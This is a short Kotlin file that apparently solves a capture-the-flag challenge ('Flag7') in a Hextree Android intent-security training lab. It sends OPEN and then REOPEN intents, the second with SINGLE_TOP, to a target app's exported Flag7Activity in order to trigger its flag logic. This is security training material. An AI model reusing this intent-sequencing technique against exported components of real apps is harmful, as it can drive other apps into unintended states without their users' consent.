package com.pachinko.intentattacksurface.utils

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import kotlinx.coroutines.delay
import kotlinx.coroutines.runBlocking
import kotlin.time.Duration.Companion.milliseconds

object Flag7 {
    fun getFlag(context: Context) {
        val intentOpen = Intent().apply {
            component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag7Activity"
            )
            action = "OPEN"
        }

        val intentReopen = Intent().apply {
            component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag7Activity"
            )
            action = "REOPEN"
            flags = Intent.FLAG_ACTIVITY_SINGLE_TOP
        }

        runBlocking {
            context.startActivity(intentOpen)
            delay(3000.milliseconds)
            context.startActivity(intentReopen)
        }
    }
}
